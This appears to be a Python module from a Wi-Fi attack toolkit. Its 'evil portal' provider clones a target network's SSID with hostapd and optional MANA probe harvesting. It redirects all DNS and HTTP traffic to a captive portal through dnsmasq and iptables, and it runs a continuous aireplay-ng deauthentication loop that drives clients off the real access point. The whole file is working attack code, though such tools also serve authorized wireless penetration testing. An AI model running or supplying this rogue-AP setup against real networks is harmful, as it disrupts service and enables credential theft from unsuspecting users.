"""Evil portal infrastructure provider — hostapd, dnsmasq, iptables orchestration."""

from __future__ import annotations

import logging
import os
from pathlib import Path
import shutil
import signal
import subprocess
from typing import Optional

from wifi_launchpad.app.settings import get_settings
from wifi_launchpad.domain.evil_portal import PortalConfig, PortalSession

logger = logging.getLogger(__name__)


class EvilPortalProvider:
    """Manage hostapd, dnsmasq, iptables for rogue AP deployment.

    Follows the HCX provider pattern: static is_available(), subprocess Popen
    with os.setsid for process group management, config file generation to
    temp dir, clean teardown with state restore.
    """

    def __init__(self, output_dir: Optional[Path] = None):
        self.output_dir = Path(output_dir or get_settings().temp_dir / "evil_portal")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._original_ip_forward: Optional[str] = None
        self._iptables_backup: Optional[Path] = None

    @staticmethod
    def is_available() -> bool:
        """Return whether hostapd and dnsmasq are installed."""
        return bool(shutil.which("hostapd") and shutil.which("dnsmasq"))

    @staticmethod
    def has_mana() -> bool:
        """Return whether hostapd-mana (KARMA/MANA) is available."""
        return bool(shutil.which("hostapd-mana"))

    # ── Config Generation ────────────────────────────────────────────────

    def configure_hostapd(self, config: PortalConfig) -> Path:
        """Write hostapd.conf and return its path."""
        hw_mode = "a" if config.target_channel > 14 else "g"
        lines = [
            f"interface={config.ap_interface}",
            "driver=nl80211",
            f"ssid={config.target_ssid}",
            f"channel={config.target_channel}",
            f"hw_mode={hw_mode}",
            "wmm_enabled=0",
        ]
        if config.target_channel > 14:
            lines.append("ieee80211d=1")
            lines.append("country_code=US")
        if config.use_mana and self.has_mana():
            lines.extend([
                "enable_mana=1",
                "mana_loud=1",
                f"mana_outfile={self.output_dir / 'mana_probes.log'}",
            ])
        conf_path = self.output_dir / "hostapd.conf"
        conf_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        logger.info("Wrote hostapd.conf: %s", conf_path)
        return conf_path

    def configure_dnsmasq(self, config: PortalConfig) -> Path:
        """Write dnsmasq.conf and return its path."""
        lines = [
            f"interface={config.ap_interface}",
            f"listen-address={config.gateway_ip}",
            "bind-interfaces",
            f"dhcp-range={config.dhcp_range_start},{config.dhcp_range_end},"
            f"{config.subnet_mask},24h",
            f"dhcp-option=3,{config.gateway_ip}",
            f"dhcp-option=6,{config.gateway_ip}",
            f"address=/#/{config.gateway_ip}",
            "no-resolv",
            "log-queries",
            f"log-facility={self.output_dir / 'dnsmasq.log'}",
        ]
        settings = get_settings().evil_portal
        if settings.use_dhcp_option_114:
            lines.append(f"dhcp-option=114,http://{config.gateway_ip}/portal")
        conf_path = self.output_dir / "dnsmasq.conf"
        conf_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        logger.info("Wrote dnsmasq.conf: %s", conf_path)
        return conf_path

    # ── Interface & Firewall ─────────────────────────────────────────────

    def setup_interface(self, interface: str, gateway_ip: str) -> bool:
        """Configure the AP interface with a gateway IP and enable forwarding."""
        try:
            self._original_ip_forward = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
            subprocess.run(["sudo", "ip", "addr", "flush", "dev", interface], check=True, capture_output=True)
            subprocess.run(["sudo", "ip", "addr", "add", f"{gateway_ip}/24", "dev", interface],
                           check=True, capture_output=True)
            subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True, capture_output=True)
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                           check=True, capture_output=True)
            logger.info("Interface %s configured with %s/24", interface, gateway_ip)
            return True
        except (subprocess.CalledProcessError, OSError) as exc:
            logger.error("Failed to setup interface %s: %s", interface, exc)
            return False

    def setup_iptables(self, config: PortalConfig) -> bool:
        """Save current iptables rules and configure portal redirect rules."""
        backup = self.output_dir / "iptables.backup"
        try:
            result = subprocess.run(["sudo", "iptables-save"], capture_output=True, text=True, check=True)
            backup.write_text(result.stdout, encoding="utf-8")
            self._iptables_backup = backup

            cmds = [
                ["sudo", "iptables", "-F"],
                ["sudo", "iptables", "-t", "nat", "-F"],
                ["sudo", "iptables", "-X"],
                ["sudo", "iptables", "-t", "nat", "-X"],
                ["sudo", "iptables", "-P", "FORWARD", "ACCEPT"],
                ["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", "80", "-j", "ACCEPT"],
                ["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", "443", "-j", "ACCEPT"],
                ["sudo", "iptables", "-A", "INPUT", "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
                ["sudo", "iptables", "-A", "INPUT", "-p", "udp", "--dport", "67", "-j", "ACCEPT"],
                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", config.ap_interface,
                 "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{config.gateway_ip}:80"],
                ["sudo", "iptables", "-A", "FORWARD", "-i", config.ap_interface,
                 "-p", "tcp", "--dport", "443", "-j", "REJECT"],
                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", config.ap_interface,
                 "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", f"{config.gateway_ip}:53"],
                ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"],
            ]
            for cmd in cmds:
                subprocess.run(cmd, check=True, capture_output=True)
            logger.info("iptables configured for portal on %s", config.ap_interface)
            return True
        except (subprocess.CalledProcessError, OSError) as exc:
            logger.error("Failed to setup iptables: %s", exc)
            return False

    def restore_iptables(self) -> bool:
        """Restore iptables from backup and reset ip_forward."""
        try:
            if self._iptables_backup and self._iptables_backup.exists():
                subprocess.run(
                    ["sudo", "iptables-restore"],
                    input=self._iptables_backup.read_text(encoding="utf-8"),
                    text=True, check=True, capture_output=True,
                )
            if self._original_ip_forward is not None:
                subprocess.run(
                    ["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={self._original_ip_forward}"],
                    check=True, capture_output=True,
                )
            logger.info("iptables and ip_forward restored")
            return True
        except (subprocess.CalledProcessError, OSError) as exc:
            logger.error("Failed to restore iptables: %s", exc)
            return False

    def whitelist_client(self, client_ip: str, ap_interface: str) -> bool:
        """Grant a captured client full internet access."""
        try:
            subprocess.run(
                ["sudo", "iptables", "-I", "FORWARD", "-s", client_ip, "-i", ap_interface, "-j", "ACCEPT"],
                check=True, capture_output=True,
            )
            subprocess.run(
                ["sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "-s", client_ip,
                 "-i", ap_interface, "-p", "tcp", "--dport", "443", "-j", "ACCEPT"],
                check=True, capture_output=True,
            )
            logger.info("Whitelisted client %s on %s", client_ip, ap_interface)
            return True
        except (subprocess.CalledProcessError, OSError) as exc:
            logger.error("Failed to whitelist %s: %s", client_ip, exc)
            return False

    # ── Process Management ───────────────────────────────────────────────

    def start_hostapd(self, config_path: Path, use_mana: bool = False) -> Optional[subprocess.Popen]:
        """Start hostapd (or hostapd-mana) as a background process."""
        binary = "hostapd-mana" if use_mana and self.has_mana() else "hostapd"
        log_file = self.output_dir / "hostapd.log"
        try:
            proc = subprocess.Popen(
                ["sudo", binary, str(config_path)],
                stdout=log_file.open("w"),
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid,
            )
            logger.info("Started %s (PID %d)", binary, proc.pid)
            return proc
        except OSError as exc:
            logger.error("Failed to start %s: %s", binary, exc)
            return None

    def start_dnsmasq(self, config_path: Path) -> Optional[subprocess.Popen]:
        """Start dnsmasq as a background process."""
        log_file = self.output_dir / "dnsmasq_proc.log"
        try:
            proc = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", str(config_path), "--no-daemon", "--log-dhcp"],
                stdout=log_file.open("w"),
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid,
            )
            logger.info("Started dnsmasq (PID %d)", proc.pid)
            return proc
        except OSError as exc:
            logger.error("Failed to start dnsmasq: %s", exc)
            return None

    def start_deauth(self, config: PortalConfig) -> Optional[subprocess.Popen]:
        """Start continuous deauth loop against target AP."""
        if not config.deauth_continuous or not config.deauth_interface:
            return None
        cmd = (
            f"while true; do "
            f"sleep {config.deauth_burst_interval}; "
            f"timeout 3 aireplay-ng --deauth {config.deauth_burst_count} "
            f"-a {config.target_bssid} {config.deauth_interface}; "
            f"done"
        )
        log_file = self.output_dir / "deauth.log"
        try:
            proc = subprocess.Popen(
                ["sudo", "bash", "-c", cmd],
                stdout=log_file.open("w"),
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid,
            )
            logger.info("Started deauth loop (PID %d) targeting %s", proc.pid, config.target_bssid)
            return proc
        except OSError as exc:
            logger.error("Failed to start deauth: %s", exc)
            return None

    def _stop_process(self, process: Optional[subprocess.Popen]) -> None:
        """Terminate a process group safely (SIGTERM → wait → SIGKILL)."""
        if not process:
            return
        try:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            process.wait(timeout=5)
        except Exception:
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            except Exception:
                pass

    # ── Teardown ─────────────────────────────────────────────────────────

    def teardown(self, session: PortalSession) -> None:
        """Full ordered teardown: stop processes, restore system state, cleanup."""
        logger.info("Tearing down evil portal session %s", session.session_id)

        # Stop processes in reverse order
        if session.deauth_pid:
            self._stop_process_by_pid(session.deauth_pid)
        if session.dnsmasq_pid:
            self._stop_process_by_pid(session.dnsmasq_pid)
        if session.hostapd_pid:
            self._stop_process_by_pid(session.hostapd_pid)

        # Restore system state
        self.restore_iptables()

        # Flush interface
        try:
            subprocess.run(
                ["sudo", "ip", "addr", "flush", "dev", session.config.ap_interface],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass

        # Cleanup temp files
        for f in ("hostapd.conf", "dnsmasq.conf", "iptables.backup"):
            path = self.output_dir / f
            if path.exists():
                path.unlink()

        logger.info("Teardown complete")

    def _stop_process_by_pid(self, pid: int) -> None:
        """Stop a process by PID (for session-stored PIDs)."""
        try:
            os.killpg(pid, signal.SIGTERM)
        except ProcessLookupError:
            return
        except OSError:
            pass
        try:
            os.waitpid(pid, os.WNOHANG)
        except ChildProcessError:
            pass